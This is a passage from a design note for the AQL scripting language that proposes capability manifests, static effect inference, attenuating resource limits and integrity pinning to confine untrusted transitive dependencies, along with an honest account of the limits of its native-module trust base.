   current registry, so its reach is bounded by the module's *effective grant*,
   not by "anything." In a module granted `{}`, an opaque `do` still reaches
   `{}` — every capability word it might name is denied at runtime regardless.
   Dynamic dispatch therefore degrades only the *tightness of the inferred
   manifest*, never the confinement. Inference exists to *verify a declared set
   is tight* (a DX/audit benefit); it is not what enforces the boundary.

**Transitivity** is enumerable iff imports resolve statically — literal import
string ⇒ walk it; computed import ⇒ over-approximate or forbid; data-file
imports (`.json`/`.csv`) contribute no code and are trivially pure. **Native
modules are inference leaves:** their Go cannot be inferred from AQL, so each
carries a *trusted, attested capability summary* (once — the native set is
small, fixed, and compile-time-sealed, §9.1). The AQL-source interior is
inferred; the native leaves are labelled; the fixpoint closes. This
presupposes a *pinned* dependency graph, which today's registry does not yet
provide (§9.3).

**Static vs. dynamic.** A dynamic capability trace (run under a recording
policy that logs every `Check` — the dry-run mode of PERMISSIONS.10) discovers
a *tight* candidate set for exercised paths, but is **unsound** (covers only
executed paths). The productive pattern is: dynamic trace to *propose* a
manifest, static analysis to *prove it is an over-approximation*.

**Verdict.** The purity/reachability verdict is highly feasible, sound, and
buildable on shipped machinery — a real guarantee for the AQL-source graph.
Precise effect sets are best-effort: dynamic-eval-heavy code either annotates
or over-approximates to its grant, which the design tolerates because the
importer gates the actual grant regardless. The design should therefore lead
with reachability/purity, treat precise inference as best-effort-with-
annotations, and expose "analyzable" as a capability a strict profile can
require.

### 7.4 Worked case: when is `do [body]` analysable?

`do` is the clearest lens on §7.3 because it is AQL's general "run this code"
word, and the intuition "`do [add 1 1]` is obviously fine" is exactly right —
the question is *where the line falls*. `do`'s code-body signature is
`{Args:[TList], NoEvalArgs:{0:true}, ReturnsFn: doListReturnsFn,
CompileEffect: CompileFallbackBody}` (`native_control.go`): the body is *not*
evaluated before `do` sees it, the checker computes `do`'s result by walking
the body (`doListReturnsFn` → `RunCarrierBody`), and the compiler islands the
body **only when it is an inert const**. Both the type result and the
capability set fall out of the same body walk — so analysability is governed by
one question: *can the analyzer see the body as a known sequence of resolvable
words?*

The knowability lattice, most-to-least analysable:

| Form | Example | Analysable? |
|---|---|---|
| Syntactic inert-const literal | `do [add 1 1]` | **Yes, precisely** — identical to inlining `add 1 1`; body walked, effect set = `{}` |
| Literal referencing in-scope names | `do [x add 1]`, `do [IO.read p]` | **Yes** — names resolve in the checker's scope; effects = union of the resolved words (here `{fileops.read}`) |
| Literal with its own locals/params | `do [def y 5  y add 1]` | **Yes** — self-contained; walked as a carrier body |
| Name bound once to a literal | `def b [add 1 1]  do b` | **Usually** — needs def-substitution: feasible when the checker tracks `b`'s concrete value and `b` is not reassigned / shadowed / a parameter; degrades to "List of unknown code" otherwise |
| Computed list | `do (concat [add] [1 1])` | **Only if constant-foldable** — a pure fold to a known list is analysable; a general computation is not |
| Received / opaque value | `do (args.0)`, `do (read "x.aql" …)` | **No** — only the *type* (`List`) is known, not the *code*; over-approximate to the module's grant |

`do [add 1 1]` is trivial precisely because the body is `[Word(add), 1, 1]` —
an inert const whose single word is a pure core arithmetic op — so
`doListReturnsFn` infers `Integer` and the capability walk yields `{}`. The
boundary is **not** "is the argument written as `[...]`?" but "**can the
analyzer prove the body is an inert constant whose element words are all
statically resolvable?**" — the exact predicate the compiler already applies
for `CompileFallbackBody` islanding. Cases 1–3 satisfy it; cases 4–6 are the
degradation, and per §7.3 they degrade the inferred manifest to the ambient
grant, not the confinement. Note the analyzer cannot tell `do [literal]` from
`do computed` at the *signature* level (both match `[TList]`); the distinction
is made by the body walk, and "a `do` whose body I could not prove inert-const"
is precisely the diagnostic a strict profile turns into a
declare-or-fail requirement.

---

## 8. AQL-specific resource limits — the quantitative capability axis

Tratt's model is about *what* a dependency may do. It is silent on *how much* —
yet a purely-computational dependency with zero capabilities can still wedge or
exhaust the host (a `sort` that never terminates, a transform that splices the
tape without bound). AQL already has the governors to prevent this; this note
makes them **per-dependency and transitively attenuating**, a second capability
axis orthogonal to allow/deny.

### 8.1 Resource bounds as attenuating capabilities

The `Limits` block (§3.6) — `TimeoutMs`, `MaxStepBudget`, `MaxStackDepth`,
`MaxMemoryBytes`, `MaxOutputBytes`, `MaxSubEngineDepth` — is a *quantitative*
grant. Its composition semantics are already the right ones:
`Compose(...).Limits()` takes the **min-non-zero of each field**, i.e. the more
restrictive bound wins, folded down the chain. So a dep's effective budget is
`min(importer's, dep's declared, dep's per-edge grant)` — exactly the transitive
attenuation of §6, applied to numbers instead of scopes. A parent with a 1 M
step budget cannot be handed 10 M by a child; a child can only ever tighten.

The module manifest carries a `limits` block alongside `requires`:

```jsonic
capabilities: {
  subset: "pure"
  limits: { maxStepBudget: 200000, maxMemoryBytes: 8388608 }  // this lib is small
}
```

### 8.2 Wiring the declared limits into the enforced governors

The gap (§3.6) is that `Limits` is declared/composed/displayed but **never
enforced**. Closing it, per field:

| Field | Enforcement path (proposed) | Difficulty |
|---|---|---|
| `MaxStepBudget` | production setter on `Engine.stepLimit`, applied per sub-engine at `newSubEngineRegistry`; the Run loop already meters steps | **low** — the loop exists |
| **tape ceiling** (`MaxMemoryBytes`) | `reg.TapeConfig` is already per-registry; give a child a stricter `TapeConfig` derived from the composed limit. Bytes→entries needs a `÷160` translation against the entry ceiling | **low–med** — knob exists, needs translation |
| `MaxSubEngineDepth` | a depth counter threaded through `runInSubEngine` / import, checked against the composed value (default 8) | **low** |
| `MaxOutputBytes` | meter `r.Output`/`r.ErrOutput` writers (output is unscoped today) | **med** — new metering |
| `TimeoutMs` | a `context` deadline cooperatively checked at the step counter (no wall-clock governor exists today; the async `timeout` word is unrelated) | **med** — new mechanism |
| `MaxStackDepth` | a distinct value-stack-depth check (only the tape/VM ceiling exists today) | **med** |

The tape ceiling is the cleanest first win: it is *already* per-registry, so a
child module can be given a smaller tape than its parent with a one-field
change, immediately bounding a runaway dependency's memory to, say, 8 MB while
the host keeps its 64 MB.

### 8.3 Determinism as a capability

Denying `clock` and the `rand` seed makes a dependency's execution
**reproducible** — valuable for supply-chain auditing (same input ⇒ same
behaviour ⇒ diffable) and as the precondition for the
[EOP report](effect-oriented-programming-in-aql-report.0.md)'s `with-handler`
testing story. Two known leaks must be closed first (§9.4): `TimeUtil.sleep` /
`timeout` / `interval` / `elapsed` and `aql:test` bypass `EffectiveClock` and
call `time.*` directly, so a "no clock" grant is not yet airtight.

The end state for a pure algorithm dependency: **`{}` capabilities + a bounded
tape/step budget + no clock/rand** ⇒ it cannot exfiltrate, cannot hang, cannot
OOM, and cannot even observe wall-time. That is total confinement of an
untrusted transitive dependency, at the cost of a hashtable lookup per word —
Tratt's aspiration, minus the hardware.

---

## 9. The native-module boundary — honest limits

Matching Tratt's own candour ("sometimes we have to accept that all the
trade-offs available to us are unpalatable"), this section states exactly what
the model does *not* cover.

### 9.1 Native modules are the trusted computing base

Everything in §2–§8 confines **AQL-source** modules. A **native/Go** module —
anything reached via `import "aql:<name>"` through the static compile-time
`modules` map, or registered by a host via `(*AQL).Register` /
`RegisterNativeFunc` / `RegisterExternalBuiltin` / `ExtensionPayload` — is
arbitrary Go. It runs with the process's full authority (files, network, exec,
memory) and Tratt's original argument applies to it *in full*. Policy gates
whether a native module is **imported** (`modules.Resolve`), but once loaded its
Go executes unsandboxed; the fine-grained wrappers only gate the *host
capabilities* it chooses to route through, not what its Go can do directly.

The one structural mitigation is real and worth stating: **AQL is "sealed at
compile time"** ([GO-MODULES.10](GO-MODULES.10.md)) — no FFI, no dynamic
loading, no plugin `.so`. "The host registration list is the trust boundary."
A third party cannot inject a native module at runtime; the native tier is
fixed when the `aql` binary is built and is auditable in one place. So the trust
model is a **two-tier graph**:

- a **small, fixed, build-time-audited native TCB** (the interpreter + the
  compiled-in native modules), where trust must be scarce and manual — and *is*,
  because it is small and changes rarely; and
- an **open-ended, structurally-confined AQL-source dependency graph** above it,
  where trust is cheap because it is enforced, not extended.

This is a defensible answer to Tratt: don't try to secure an unbounded native
graph (his conclusion that this is "fundamentally incompatible with security");
instead keep the native graph tiny and fixed, and make the *unbounded* part of
the graph interpreted and confined.

### 9.2 In-process, not OS isolation

Per PERMISSIONS.10: in-process capability confinement is **defence in depth for
moderately untrusted code, not a substitute for OS isolation against truly
hostile input.** A deployment taking genuinely adversarial AQL should *also* run
the host under a container with seccomp, a read-only rootfs, and net-namespace
isolation. Side channels (timing, cache) are out of scope — an OS/hardware
concern.

### 9.3 Distribution integrity is a prerequisite

A capability manifest is only meaningful if the artifact it rides on is
integrity-checked, and today the `install`/`import` path has **no signing, no
lockfile, no content hash** — `aql install` fetches a zip from whatever registry
URL `-r` names, checked only for size and zip-slip; `deps` records only
`name→version`. A different registry can serve arbitrary bytes under any
`name-version`. The [aql-vendor.0](aql-vendor.0.md) design already specifies the
right shape for the *separate* vendored-source axis — a `vendor.lock` pinning a
resolved commit SHA and a canonical Merkle `tree` hash, `--frozen`
reproducibility, and future sigstore `--require-signed`. **This note recommends
adopting the same model on the module-registry path**, so that a module's
declared capabilities and its code are pinned *together*: the capability diff of
§4.3 is only trustworthy if the bytes are content-addressed and (ideally)
signed. Without this, a manifest is advisory; with it, the manifest + code are a
single verifiable, attributable unit.

### 9.4 Known leaks to close

- **By-reference shared state (§3.4).** Pointer-backed payloads (`Store`,
  `Array`, `Map`) shared across the import boundary are a mutation channel — a
  dependency handed a shared `Store` can mutate what the parent observes.
  Attenuation must hand down *attenuated wrappers* and treat shared mutable
  payloads as a covert-channel surface.
- **Clock is leaky.** `sleep`/`timeout`/`interval`/`elapsed` and `aql:test`
  bypass `EffectiveClock`; a "no clock" grant is not airtight until these route
  through the injectable clock.
- **`env`/`process`/`system-info` are taxonomy-ahead-of-surface.** The scopes
  and globals exist but no AQL word reads an env var, spawns a process, or reads
  system info yet; the gates are scaffolding. When those words land, they must
  route through the scopes on day one.
- **The per-export gate and the `Limits` enforcement are stubs** (§3.2, §3.6) —
  until wired, per-export denies and every declared budget are inert.

---

## 10. Implementation sketch (phased)

Each phase ends green (`make fmt && vet && lint && test`) and is independently
shippable, matching the PERMISSIONS-PLAN.10 discipline.

- **Phase 0 — finish the substrate (mostly plumbing).** Standardize on
  `Compose`; delete/deprecate `RequireSubset` usage. Wire the per-export gate
  (`checkModuleCall` → real call site). Enforce `MaxSubEngineDepth` (depth
  counter). Wire `MaxStepBudget` and the per-registry tape ceiling from
  `policy.Limits`. *(No new concepts; closes the §3 gaps.)*
- **Phase 1 — the manifest.** `capabilities.{requires,subset,limits}` block in
  `aql.jsonic` → `.aql/aql.json`; read at module load; undeclared ⇒ deny;
  resolve the "absent" sentinel at one boundary.
- **Phase 2 — per-edge attenuation.** `RunModuleBody` (and native-module
  install) install `effective`-parameterized wrappers instead of inheriting;
  propagate `CapPolicy` to child sub-registries; importer `with { … }` override
  and/or a per-dep grant block. Reuse `aql:vm`'s `Compose` path.
- **Phase 3 — static verification.** `Effects []string` on signatures; union
  fixpoint in the carrier checker (EOP idea #1); `aql check` verifies declared ⊇
  inferred; `--emit-capabilities` writes the manifest; publish-time gate;
  `-util` purity as a checked invariant.
- **Phase 4 — well-known subsets.** Named per-module subset vocabulary
  (`pure`/`deterministic`/`read-only`/`compute`/`client`); importer
  default-subset-for-all-transitive-deps policy.
- **Phase 5 — distribution integrity.** Content-hash + lockfile + optional
  signature on the module-registry path (adopt the vendor.lock model), so
  manifest + code are pinned together.
- **Phase 6 — the rest of the `Limits` axis.** `TimeoutMs` deadline,
  `MaxOutputBytes` metering, `MaxStackDepth`; close the clock leaks for a real
  `deterministic` subset.

Phases 0–2 deliver the core: real transitive attenuation with a manifest.
Phase 3 is what makes the manifest *trustworthy* rather than *claimed* — the
single highest-value item for the supply-chain story.

---

## 11. Prior art

| System | Relation to this design |
|---|---|
| WebAssembly component model / WASI | Tratt's own cited "partial solution to performance"; capabilities as explicit imports. AQL lands the same idea at the interpreter layer, with cheaper cell boundaries and a static checker over its *own* source. |
| Deno permissions | Declarative, syscall-family scoping; process-wide. AQL is finer (per-module, per-word) and in-process. The "no runtime grant/revoke" lesson is shared. |
| E / object-capability languages | The no-ambient-authority, capabilities-are-not-forgeable model AQL implements via wrapped slots. |
| CHERI compartments (Tratt) | Hardware capability pointers; powerful but temporally fragile. AQL trades hardware generality for interpreter-enforced simplicity and no first-class capability values to leak. |
| Newspeak / Wyvern / Austral capability-safe modules | Language-level capability-safe imports; closest kin. AQL adds a static effect-inference *verifier* over an existing checker. |
| Go build-time sealing | The native-TCB-fixed-at-build-time property (§9.1). |
| AppArmor / AWS IAM / `pledge` | The glob rules, last-match-wins, and bounding-set (global hard-cap) shapes AQL's policy already borrows. |

AQL's distinctive claim is not any single mechanism but their *composition*: no
ambient authority + cheap in-process cells + declarative attenuating policy +
a static effect checker, applied to the AQL-source dependency graph, with a
small sealed native TCB underneath.

---

## 12. Open questions

1. **Manifest granularity.** Scope-level (`fileops`) vs. op-level
   (`fileops.read`) vs. `where`-level (`path in [...]`)? Start op-level; allow
   `where` for `fileops`/`network`.
2. **Ask-exceeds-offer arbitration.** When a dep's declared ask exceeds the
   importer's default grant: fail-closed (import error), silently narrow, or
   prompt at `aql install`? Lean fail-closed with an explicit `with { … }`
   opt-in.
3. **Native-module capability declaration.** A native module can *declare* a
   footprint but cannot be *verified* (§9.1). Attest it (signature + a
   host-registration allowlist) rather than trust the declaration; surface it in
   `describe` so importers see which deps are native (unverifiable) vs.
   AQL-source (verifiable).
4. **Effect-inference precision.** Dynamic dispatch, `do`/`call` of computed
   code, and reflection-like words bound how precisely `actual` capabilities can
   be inferred. Over-approximate (a computed call reaches its declared bound) and
   require an explicit declaration where inference is imprecise.
5. **Shared mutable payloads (§9.4).** Are by-reference `Store`/`Array` exports
   a capability in their own right (a "mutate-parent-state" grant)? Possibly they
   should be copied at attenuated edges despite the cost.
6. **Is per-edge import just `vm.run-with` sugar?** (§5.3) If the semantics are
   identical, implement once and expose `import … with` as the surface.
7. **Multi-parent deps.** A dep imported by two parents with different grants:
   distinct attenuated instances per edge (safe, duplicated) vs. one instance at
   the join (must be the *intersection*)? Lean per-edge instances.

---

## See also

- [PERMISSIONS.10](PERMISSIONS.10.md) — the implemented host-side policy model
  this extends (note the `RequireSubset`→`Compose` and enforcement corrections in
  §3).
- [IMPORTS.10](IMPORTS.10.md), [NATIVE-MODULES.10](NATIVE-MODULES.10.md) — the
  import path and module system the manifest/attenuation hook into.
- [FILE-ACCESS.10](FILE-ACCESS.10.md) — the `FileOps` capability the wrapping
  pattern generalises.
- [effect-oriented-programming-in-aql-report.0](effect-oriented-programming-in-aql-report.0.md)
  — idea #1 (static effect inference) is the verification mechanism of §7.
- [aql-vendor.0](aql-vendor.0.md) — the integrity/lockfile/signing model §9.3
  recommends adopting for the module path.
- [GO-MODULES.10](GO-MODULES.10.md) — the compile-time-sealed native TCB (§9.1).
- [TAPE-DATA-STRUCTURE.10](TAPE-DATA-STRUCTURE.10.md),
  [RESOURCE-SAFETY.0](RESOURCE-SAFETY.0.md) — the tape ceiling and resource
  bounds of §8.
- Laurence Tratt, [*Can We Retain the Benefits of Transitive Dependencies
  Without Undermining Security?*](https://tratt.net/laurie/blog/2024/can_we_retain_the_benefits_of_transitive_dependencies_without_undermining_security.html)
  (2025) — the essay this note answers.
